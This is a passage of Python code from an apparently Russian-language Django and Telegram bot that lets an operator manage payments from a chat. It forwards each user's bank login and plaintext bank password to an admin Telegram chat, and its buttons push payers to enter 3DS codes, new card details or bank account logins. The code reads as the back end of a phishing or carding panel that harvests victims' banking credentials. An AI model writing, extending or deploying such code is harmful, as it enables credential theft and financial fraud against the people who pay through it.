            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status not in ['waiting_3ds', '3ds_submitted']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не ожидает 3DS (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = '3ds_rejected'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='3ds_verification', 
                status='failed', 
                description='3DS rejected by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ 3DS код для платежа {payment_id} отклонен"
            )
            
        except Exception as e:
            logger.error(f"Error rejecting 3DS: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при отклонении 3DS: {str(e)}"
            )

    async def _request_3ds(self, callback_query, payment_id):
        """Request 3DS: set waiting_3ds and create current step"""
        try:
            from payments_new.models import Payment, PaymentStep
            from asgiref.sync import sync_to_async
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status in ['completed', 'failed', 'cancelled']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} уже завершен (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = 'waiting_3ds'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='3ds_verification', 
                status='current', 
                description='3DS requested by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"[3DS] Запрошен 3DS код для платежа {payment_id}"
            )
            
        except Exception as e:
            logger.error(f"Error requesting 3DS: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при запросе 3DS: {str(e)}"
            )

    async def _request_new_card(self, callback_query, payment_id):
        """Request new card: set requires_new_card and step"""
        try:
            from payments_new.models import Payment, PaymentStep
            from asgiref.sync import sync_to_async
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status in ['completed', 'failed', 'cancelled']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} уже завершен (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = 'requires_new_card'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='new_card_request', 
                status='current', 
                description='New card requested by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"💳 Запрошены новые данные карты для платежа {payment_id}"
            )
            
        except Exception as e:
            logger.error(f"Error requesting new card: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при запросе новой карты: {str(e)}"
            )

    async def _request_bank_login(self, callback_query, payment_id):
        """Request bank login: set requires_bank_login and step"""
        try:
            from payments_new.models import Payment, PaymentStep
            from asgiref.sync import sync_to_async
            
            # Validate payment_id format
            if not payment_id or len(str(payment_id)) < 10:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text="❌ Неверный формат ID платежа")
                return
            
            # Use sync_to_async for Django ORM operations
            payment = await sync_to_async(Payment.objects.filter(id=payment_id).first)()
            if not payment:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} не найден")
                return
            
            # Validate payment status
            if payment.status in ['completed', 'failed', 'cancelled']:
                await self.bot.send_message(chat_id=callback_query.message.chat.id, text=f"❌ Платеж {payment_id} уже завершен (статус: {payment.status})")
                return
            
            # Update payment status
            payment.status = 'requires_bank_login'
            await sync_to_async(payment.save)(update_fields=['status'])
            
            # Create payment step
            await sync_to_async(PaymentStep.objects.create)(
                payment=payment, 
                step_type='bank_login', 
                status='current', 
                description='Bank login requested by admin'
            )
            
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"🏦 Запрошен вход в ЛК банка для платежа {payment_id}"
            )
            
        except Exception as e:
            logger.error(f"Error requesting bank login: {e}")
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id, 
                text=f"❌ Ошибка при запросе банковского входа: {str(e)}"
            )

    async def _approve_manager(self, callback_query, manager_id):
        """Approve manager application"""
        try:
            # TODO: Implement manager approval logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"✅ Заявка на менеджера {manager_id} одобрена"
            )
        except Exception as e:
            logger.error(f"Error approving manager: {e}")

    async def _reject_manager(self, callback_query, manager_id):
        """Reject manager application"""
        try:
            # TODO: Implement manager rejection logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"❌ Заявка на менеджера {manager_id} отклонена"
            )
        except Exception as e:
            logger.error(f"Error rejecting manager: {e}")

    async def _approve_promo_request(self, callback_query, promo_request_id):
        """Approve promo code request"""
        try:
            # TODO: Implement promo request approval logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"✅ Запрос на промокод {promo_request_id} одобрен"
            )
        except Exception as e:
            logger.error(f"Error approving promo request: {e}")

    async def _reject_promo_request(self, callback_query, promo_request_id):
        """Reject promo code request"""
        try:
            # TODO: Implement promo request rejection logic
            await self.bot.send_message(
                chat_id=callback_query.message.chat.id,
                text=f"❌ Запрос на промокод {promo_request_id} отклонен"
            )
        except Exception as e:
            logger.error(f"Error rejecting promo request: {e}")

    def notify_admin_bank_credentials_sync(self, payment):
        """Synchronous version of notify_admin_bank_credentials"""
        try:
            message = f"""
🏦 БАНКОВСКИЕ ДАННЫЕ ПОЛУЧЕНЫ

Платеж: {payment.id}
Пользователь: {payment.user.email}
Сумма: {payment.amount} {payment.currency}
Метод: {payment.payment_method}

🏦 Банковские данные:
   Банк: {payment.bank_name if payment.bank_name else 'N/A'}
   Логин: {payment.bank_login if payment.bank_login else 'N/A'}
   Пароль: {payment.bank_password if payment.bank_password else 'N/A'}

⏰ Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"payment_approve_{payment.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"payment_reject_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[3DS] Запросить 3DS", callback_data=f"payment_request_3ds_{payment.id}"),
                    InlineKeyboardButton("[CARD] Запросить новую карту", callback_data=f"payment_new_card_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[BANK] Перебросить на вход в ЛК банка", callback_data=f"payment_bank_login_{payment.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self._run_async_in_thread(self.send_message_to_admin(message, reply_markup))
            logger.info(f"Bank credentials notification sent for payment {payment.id}")
            
        except Exception as e:
            logger.error(f"Error in bank credentials notification: {e}")
            logger.exception("Full traceback:")

    # ===== PROMO CODE FUNCTIONS =====
    
    def notify_admin_manager_application(self, manager):
        """Notify admin about new manager application"""
        try:
            message = f"""
👨‍💼 НОВАЯ ЗАЯВКА НА МЕНЕДЖЕРА

👤 Пользователь: {manager.user.email}
📱 Telegram: {manager.telegram_username}
📅 Дата подачи: {manager.created_at.strftime('%Y-%m-%d %H:%M:%S')}

📊 Опыт: {manager.experience_years} лет
📝 Описание: {manager.experience_description}
🛠️ Навыки: {', '.join(manager.skills) if manager.skills else 'Не указаны'}

⏰ Время: {manager.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"manager_approve_{manager.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"manager_reject_{manager.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self._run_async_in_thread(self.send_message_to_admin(message, reply_markup))
            logger.info(f"Manager application notification sent for {manager.user.email}")
            
        except Exception as e:
            logger.error(f"Error in manager application notification: {e}")
            logger.exception("Full traceback:")

    def notify_manager_approved(self, manager):
        """Notify manager that their application was approved"""
        try:
            message = f"""
🎉 ВАША ЗАЯВКА ОДОБРЕНА!

👨‍💼 Статус: Активный менеджер
📱 Telegram: {manager.telegram_username}
💰 Комиссия: {manager.commission_rate}%

Теперь вы можете:
• Создавать запросы на промокоды
• Получать комиссию с привлеченных пользователей
• Отслеживать свою статистику

📈 Ваша статистика:
• Создано промокодов: {manager.total_promos_created}
• Привлечено пользователей: {manager.total_users_referred}
• Общая выручка: {manager.total_revenue_generated} EUR

Для создания промокода используйте команду /create_promo
            """
            
            if manager.telegram_chat_id:
                self._run_async_in_thread(self.send_message_to_user(manager.telegram_chat_id, message))
            else:
                # Send to admin chat for manual forwarding
                admin_message = f"✅ Менеджер {manager.user.email} одобрен. Отправьте уведомление в Telegram: {manager.telegram_username}"
                self._run_async_in_thread(self.send_message_to_admin(admin_message))
            
            logger.info(f"Manager approval notification sent to {manager.user.email}")
            
        except Exception as e:
            logger.error(f"Error in manager approval notification: {e}")
            logger.exception("Full traceback:")

    def notify_admin_promo_request(self, promo_request):
        """Notify admin about new promo code request"""
        try:
            message = f"""
🎯 НОВЫЙ ЗАПРОС НА ПРОМОКОД

👨‍💼 Менеджер: {promo_request.manager.user.email}
📱 Telegram: {promo_request.manager.telegram_username}
📅 Дата подачи: {promo_request.created_at.strftime('%Y-%m-%d %H:%M:%S')}

📝 Детали промокода:
Код: {promo_request.promo_code}
Название: {promo_request.name}
Описание: {promo_request.description}

💰 Скидка: {promo_request.discount_value} {promo_request.get_discount_type_display()}
📊 Лимиты: {promo_request.max_uses_per_user} на пользователя, {promo_request.total_max_uses or 'безлимитно'} всего
⏰ Действует дней: {promo_request.valid_days}

📈 Статистика менеджера:
• Создано промокодов: {promo_request.manager.total_promos_created}
• Привлечено пользователей: {promo_request.manager.total_users_referred}
• Общая выручка: {promo_request.manager.total_revenue_generated} EUR

⏰ Время: {promo_request.created_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"promo_approve_{promo_request.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"promo_reject_{promo_request.id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self._run_async_in_thread(self.send_message_to_admin(message, reply_markup))
            logger.info(f"Promo request notification sent for {promo_request.promo_code}")
            
        except Exception as e:
            logger.error(f"Error in promo request notification: {e}")
            logger.exception("Full traceback:")

    def notify_manager_promo_approved(self, promo_request, promo):
        """Notify manager that their promo code request was approved"""
        try:
            message = f"""
🎉 ВАШ ПРОМОКОД ОДОБРЕН!

📝 Детали:
Код: {promo.code}
Название: {promo.name}
Статус: Активен

💰 Скидка: {promo.discount_value} {promo.get_discount_type_display()}
📊 Лимиты: {promo.max_uses} на пользователя, {promo.total_max_uses or 'безлимитно'} всего
⏰ Действует до: {promo.valid_until.strftime('%Y-%m-%d %H:%M:%S')}

Теперь вы можете делиться этим промокодом с пользователями!

📈 Ваша статистика обновлена:
• Создано промокодов: {promo_request.manager.total_promos_created}
• Привлечено пользователей: {promo_request.manager.total_users_referred}
• Общая выручка: {promo_request.manager.total_revenue_generated} EUR
            """
            
            # Try to send to manager's Telegram if available
            if promo_request.manager.telegram_chat_id:
                self._run_async_in_thread(self.send_message_to_user(promo_request.manager.telegram_chat_id, message))
            else:
                # Send to admin chat for manual forwarding
                admin_message = f"✅ Промокод {promo.code} одобрен. Отправьте уведомление менеджеру {promo_request.manager.user.email} в Telegram: {promo_request.manager.telegram_username}"
                self._run_async_in_thread(self.send_message_to_admin(admin_message))
            
            logger.info(f"Promo approval notification sent to manager {promo_request.manager.user.email}")
            
        except Exception as e:
            logger.error(f"Error in promo approval notification: {e}")
            logger.exception("Full traceback:")

    def notify_promo_usage(self, usage):
        """Notify about promo code usage"""
        try:
            # Notify admin
            admin_message = f"""
🎯 ПРОМОКОД ИСПОЛЬЗОВАН

Пользователь: {usage.user.email}
Промокод: {usage.promo_code.code}
Сумма депозита: {usage.deposit_amount} EUR
Скидка: {usage.discount_amount} EUR
Бонусные монеты: {usage.bonus_coins} NEON

⏰ Время: {usage.used_at.strftime('%Y-%m-%d %H:%M:%S')}
            """
            
            self._run_async_in_thread(self.send_message_to_admin(admin_message))
            
            # Notify manager if assigned
            if hasattr(usage, 'assigned_manager') and usage.assigned_manager:
                manager_message = f"""
🎯 ВАШ ПРОМОКОД ИСПОЛЬЗОВАН!

Пользователь: {usage.user.email}
Промокод: {usage.promo_code.code}
Сумма депозита: {usage.deposit_amount} EUR
Скидка: {usage.discount_amount} EUR

💰 Ваша комиссия: {(usage.deposit_amount * usage.assigned_manager.commission_rate / 100):.2f} EUR

📈 Обновленная статистика:
• Привлечено пользователей: {usage.assigned_manager.total_users_referred}
• Общая выручка: {usage.assigned_manager.total_revenue_generated} EUR
                """
                
                if usage.assigned_manager.telegram_chat_id:
                    self._run_async_in_thread(self.send_message_to_user(usage.assigned_manager.telegram_chat_id, manager_message))
            
            logger.info(f"Promo usage notification sent for {usage.promo_code.code}")
            
        except Exception as e:
            logger.error(f"Error in promo usage notification: {e}")
            logger.exception("Full traceback:")

    def send_message_to_user(self, chat_id, message, reply_markup=None):
        """Send message to specific user"""
        try:
            asyncio.run(self._send_message_async(chat_id, message, reply_markup))
        except Exception as e:
            logger.error(f"Error sending message to user {chat_id}: {e}")

    async def _send_message_async(self, chat_id, message, reply_markup=None):
        """Async version of send_message_to_user"""
        try:
            await self.bot.send_message(
                chat_id=chat_id,
                text=message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Error in async message sending: {e}")

    def notify_admin_new_card_submitted_sync(self, payment):
        """Notify admin about new card submission"""
        try:
            message = f"🆕 Новая карта запрошена\n\n"
            message += f"💰 Сумма: {payment.amount} {payment.currency}\n"
            message += f"👤 Пользователь: {payment.user.email}\n"
            message += f"🆔 ID платежа: {payment.id}\n"
            message += f"📅 Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"🌐 IP: {payment.payment_ip}\n"
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"payment_approve_{payment.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"payment_reject_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[3DS] Запросить 3DS", callback_data=f"payment_request_3ds_{payment.id}"),
                    InlineKeyboardButton("[CARD] Запросить новую карту", callback_data=f"payment_new_card_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[BANK] Перебросить на вход в ЛК банка", callback_data=f"payment_bank_login_{payment.id}")
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self.bot.send_message(
                chat_id=self.get_admin_chat_id(),
                text=message,
                reply_markup=reply_markup
            )
            logger.info(f"Admin notification sent for new card submission: {payment.id}")
        except Exception as e:
            logger.error(f"Failed to send admin notification for new card: {e}")

    def notify_admin_bank_transfer_submitted_sync(self, payment):
        """Notify admin about bank transfer submission"""
        try:
            message = f"🏦 Банковский перевод\n\n"
            message += f"💰 Сумма: {payment.amount} {payment.currency}\n"
            message += f"👤 Пользователь: {payment.user.email}\n"
            message += f"🆔 ID платежа: {payment.id}\n"
            message += f"🏛️ Банк: {payment.bank_name}\n"
            message += f"📝 Владелец счета: {payment.bank_account_holder}\n"
            message += f"📅 Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"🌐 IP: {payment.payment_ip}\n"
            
            keyboard = [
                [
                    InlineKeyboardButton("✅ Одобрить", callback_data=f"payment_approve_{payment.id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"payment_reject_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[3DS] Запросить 3DS", callback_data=f"payment_request_3ds_{payment.id}"),
                    InlineKeyboardButton("[CARD] Запросить новую карту", callback_data=f"payment_new_card_{payment.id}")
                ],
                [
                    InlineKeyboardButton("[BANK] Перебросить на вход в ЛК банка", callback_data=f"payment_bank_login_{payment.id}")
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            self.bot.send_message(
                chat_id=self.get_admin_chat_id(),
                text=message,
                reply_markup=reply_markup
            )
            logger.info(f"Admin notification sent for bank transfer: {payment.id}")
        except Exception as e:
            logger.error(f"Failed to send admin notification for bank transfer: {e}")


class TelegramNotificationService:
    """Service for sending Telegram notifications about user events"""
    
    def __init__(self):
        self.bot_settings = None
        self.bot = None
        self._initialized = False
    
    def _ensure_initialized(self):
        """Инициализируем бота только при необходимости"""
        if not self._initialized:
            try:
                self.bot_settings = BotSettings.objects.first()
                if self.bot_settings and self.bot_settings.bot_token:
                    self.bot = Bot(token=self.bot_settings.bot_token)
                else:
                    self.bot = None
                    logger.warning("Telegram bot not configured")
                self._initialized = True
            except Exception as e:
                logger.error(f"Error initializing Telegram bot: {e}")
                self.bot = None
                self._initialized = True
    
    async def notify_user_registration(self, user, promo_code=None):
        """Notify about new user registration"""
        self._ensure_initialized()
        if not self.bot:
            return
        
        try:
            # Get promo code info if provided
            manager_name = None
            if promo_code:
                try:
                    promo_obj = PromoCode.objects.get(code=promo_code)
                    if promo_obj.created_by:
                        # Use @username format for Telegram
                        if promo_obj.created_by.username:
                            manager_name = f"@{promo_obj.created_by.username}"
                        else:
                            manager_name = promo_obj.created_by.first_name or promo_obj.created_by.email
                except PromoCode.DoesNotExist:
                    pass
            
            # Notify admin chat
            await self._notify_admin_user_registered(
                username=user.username or user.email,
                email=user.email,
                promo_code=promo_code,
                manager_name=manager_name
            )
            
            # If promo code was used and manager exists, notify manager chat
            if promo_code and manager_name and self.bot_settings.managers_chat_id:
                await self._notify_manager_user_registered(
                    username=user.username or user.email,
                    email=user.email,
                    promo_code=promo_code,
                    manager_name=manager_name
                )
                
        except Exception as e:
            logger.error(f"Error notifying about user registration: {e}")
    
    async def notify_promo_activation(self, user, promo_code):
        """Notify about existing user activating promo code"""
        self._ensure_initialized()
        if not self.bot:
            return
        
        try:
            # Get promo code info
            manager_name = None
            try:
                promo_obj = PromoCode.objects.get(code=promo_code)
                if promo_obj.created_by:
                    # Use @username format for Telegram
                    if promo_obj.created_by.username:
                        manager_name = f"@{promo_obj.created_by.username}"
                    else:
                        manager_name = promo_obj.created_by.first_name or promo_obj.created_by.email
            except PromoCode.DoesNotExist:
                pass
            
            # Notify admin chat
            await self._notify_admin_promo_activated(
                username=user.username or user.email,
                email=user.email,
                promo_code=promo_code,
                manager_name=manager_name
            )
            
            # If manager exists, notify manager chat
            if manager_name and self.bot_settings.managers_chat_id:
                await self._notify_manager_promo_activated(
                    username=user.username or user.email,
                    email=user.email,
                    promo_code=promo_code,
                    manager_name=manager_name
                )
                
        except Exception as e:
            logger.error(f"Error notifying about promo activation: {e}")
    
    async def _notify_admin_user_registered(self, username, email, promo_code=None, manager_name=None):
        """Send notification to admin chat about user registration"""
        try:
            self._ensure_initialized()
            admin_chat_id = self.bot_settings.admin_chat_id
            if admin_chat_id:
                message = (
                    f"👤 <b>Новый пользователь зарегистрирован!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n"
                )
                
                if promo_code:
                    message += f"<b>🎯 Промокод:</b> {promo_code}\n"
                    if manager_name:
                        message += f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name.startswith('@') else f'@{manager_name}'}\n"
                
                await self.bot.send_message(chat_id=admin_chat_id, text=message, parse_mode='HTML')
                
        except Exception as e:
            logger.error(f"Error notifying admin about user registration: {e}")
    
    async def _notify_manager_user_registered(self, username, email, promo_code, manager_name):
        """Send notification to manager chat about user registration with their promo code"""
        try:
            self._ensure_initialized()
            manager_chat_id = self.bot_settings.managers_chat_id
            if manager_chat_id:
                message = (
                    f"🎯 <b>Пользователь активировал ваш промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name.startswith('@') else f'@{manager_name}'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n\n"
                    f"✅ Отличная работа! Пользователь присоединился к платформе."
                )
                
                await self.bot.send_message(chat_id=manager_chat_id, text=message, parse_mode='HTML')
                
        except Exception as e:
            logger.error(f"Error notifying manager about user registration: {e}")
    
    async def _notify_admin_promo_activated(self, username, email, promo_code, manager_name):
        """Send notification to admin chat about promo code activation by existing user"""
        try:
            self._ensure_initialized()
            admin_chat_id = self.bot_settings.admin_chat_id
            if admin_chat_id:
                message = (
                    f"🎯 <b>Существующий пользователь активировал промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name.startswith('@') else f'@{manager_name}'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n"
                )
                
                await self.bot.send_message(chat_id=admin_chat_id, text=message, parse_mode='HTML')
                
        except Exception as e:
            logger.error(f"Error notifying admin about promo activation: {e}")
    
    async def _notify_manager_promo_activated(self, username, email, promo_code, manager_name):
        """Send notification to manager chat about promo code activation by existing user"""
        try:
            self._ensure_initialized()
            manager_chat_id = self.bot_settings.managers_chat_id
            if manager_chat_id:
                message = (
                    f"🎯 <b>Существующий пользователь активировал ваш промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name.startswith('@') else f'@{manager_name}'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n\n"
                    f"✅ Пользователь уже был на платформе, но активировал ваш промокод!"
                )
                
                await self.bot.send_message(chat_id=manager_chat_id, text=message, parse_mode='HTML')
                
        except Exception as e:
            logger.error(f"Error notifying manager about promo activation: {e}")
    
    def _get_current_time(self):
        """Get current time in formatted string"""
        from django.utils import timezone
        return timezone.now().strftime('%d.%m.%Y %H:%M')
    
    def _sync_notify_admin_user_registered(self, username, email, promo_code=None):
        """Synchronous notification to admin chat about user registration"""
        try:
            self._ensure_initialized()
            admin_chat_id = self.bot_settings.admin_chat_id
            if admin_chat_id and self.bot:
                message = (
                    f"👤 <b>Новый пользователь зарегистрирован!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n"
                )
                
                if promo_code:
                    message += f"<b>🎯 Промокод:</b> {promo_code}\n"
                
                # Use requests for synchronous HTTP call
                import requests
                url = f"https://api.telegram.org/bot{self.bot_settings.bot_token}/sendMessage"
                data = {
                    'chat_id': admin_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                response = requests.post(url, data=data)
                if response.status_code != 200:
                    logger.error(f"Failed to send admin notification: {response.text}")
                    
        except Exception as e:
            logger.error(f"Error in sync admin notification: {e}")
    
    def _sync_notify_manager_user_registered(self, username, email, promo_code):
        """Synchronous notification to manager chat about user registration"""
        try:
            self._ensure_initialized()
            manager_chat_id = self.bot_settings.managers_chat_id
            if manager_chat_id and self.bot:
                # Get manager name from promo code
                manager_name = None
                try:
                    promo_obj = PromoCode.objects.get(code=promo_code)
                    if promo_obj.created_by:
                        if promo_obj.created_by.username:
                            manager_name = f"@{promo_obj.created_by.username}"
                        else:
                            manager_name = promo_obj.created_by.first_name or promo_obj.created_by.email
                except PromoCode.DoesNotExist:
                    pass
                
                message = (
                    f"🎯 <b>Пользователь активировал ваш промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name else 'Неизвестно'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n\n"
                    f"✅ Отличная работа! Пользователь присоединился к платформе."
                )
                
                # Use requests for synchronous HTTP call
                import requests
                url = f"https://api.telegram.org/bot{self.bot_settings.bot_token}/sendMessage"
                data = {
                    'chat_id': manager_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'  # Use HTML instead of Markdown for better compatibility
                }
                response = requests.post(url, data=data)
                if response.status_code != 200:
                    logger.error(f"Failed to send manager notification: {response.text}")
                    
        except Exception as e:
            logger.error(f"Error in sync manager notification: {e}")
    
    def _sync_notify_admin_promo_activated(self, username, email, promo_code):
        """Synchronous notification to admin chat about promo activation"""
        try:
            self._ensure_initialized()
            admin_chat_id = self.bot_settings.admin_chat_id
            if admin_chat_id and self.bot:
                # Get manager name from promo code
                manager_name = None
                try:
                    promo_obj = PromoCode.objects.get(code=promo_code)
                    if promo_obj.created_by:
                        if promo_obj.created_by.username:
                            manager_name = f"@{promo_obj.created_by.username}"
                        else:
                            manager_name = promo_obj.created_by.first_name or promo_obj.created_by.email
                except PromoCode.DoesNotExist:
                    pass
                
                message = (
                    f"🎯 <b>Существующий пользователь активировал промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name else 'Неизвестно'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n"
                )
                
                # Use requests for synchronous HTTP call
                import requests
                url = f"https://api.telegram.org/bot{self.bot_settings.bot_token}/sendMessage"
                data = {
                    'chat_id': admin_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                response = requests.post(url, data=data)
                if response.status_code != 200:
                    logger.error(f"Failed to send admin promo notification: {response.text}")
                    
        except Exception as e:
            logger.error(f"Error in sync admin promo notification: {e}")
    
    def _sync_notify_manager_promo_activated(self, username, email, promo_code):
        """Synchronous notification to manager chat about promo activation"""
        try:
            self._ensure_initialized()
            manager_chat_id = self.bot_settings.managers_chat_id
            if manager_chat_id and self.bot:
                # Get manager name from promo code
                manager_name = None
                try:
                    promo_obj = PromoCode.objects.get(code=promo_code)
                    if promo_obj.created_by:
                        if promo_obj.created_by.username:
                            manager_name = f"@{promo_obj.created_by.username}"
                        else:
                            manager_name = promo_obj.created_by.first_name or promo_obj.created_by.email
                except PromoCode.DoesNotExist:
                    pass
                
                message = (
                    f"🎯 <b>Существующий пользователь активировал ваш промокод!</b>\n\n"
                    f"<b>👤 Пользователь:</b> {username}\n"
                    f"<b>📧 Email:</b> {email}\n"
                    f"<b>🎯 Промокод:</b> {promo_code}\n"
                    f"<b>👨‍💼 Менеджер:</b> {manager_name if manager_name else 'Неизвестно'}\n"
                    f"<b>📅 Время:</b> {self._get_current_time()}\n\n"
                    f"✅ Пользователь уже был на платформе, но активировал ваш промокод!"
                )
                
                # Use requests for synchronous HTTP call
                import requests
                url = f"https://api.telegram.org/bot{self.bot_settings.bot_token}/sendMessage"
                data = {
                    'chat_id': manager_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
                response = requests.post(url, data=data)
                if response.status_code != 200:
                    logger.error(f"Failed to send manager promo notification: {response.text}")
                    
        except Exception as e:
            logger.error(f"Error in sync manager promo notification: {e}")
    
    def sync_notify_user_registration(self, user, promo_code=None):
        """Synchronous wrapper for user registration notification"""
        try:
            self._ensure_initialized()
            # Only send notifications if this is a real user registration, not test
            if hasattr(user, 'is_test_user') and user.is_test_user:
                return
                
            # Use synchronous version for Django signals
            self._sync_notify_admin_user_registered(
                username=user.username or user.email,
                email=user.email,
                promo_code=promo_code
            )
            
            if promo_code:
                self._sync_notify_manager_user_registered(
                    username=user.username or user.email,
                    email=user.email,
                    promo_code=promo_code
                )
                
        except Exception as e:
            logger.error(f"Error in sync user registration notification: {e}")
    
    def sync_notify_promo_activation(self, user, promo_code):
        """Synchronous wrapper for promo activation notification"""
        try:
            self._ensure_initialized()
            # Only send notifications if this is a real promo activation, not test
            if hasattr(user, 'is_test_user') and user.is_test_user:
                return
                
            # Use synchronous version for Django signals
            self._sync_notify_admin_promo_activated(
                username=user.username or user.email,
                email=user.email,
                promo_code=promo_code
            )
            
            self._sync_notify_manager_promo_activated(
                username=user.username or user.email,
                email=user.email,
                promo_code=promo_code
            )
                
        except Exception as e:
            logger.error(f"Error in sync promo activation notification: {e}")


# Global instance for easy access
telegram_notification_service = TelegramNotificationService()
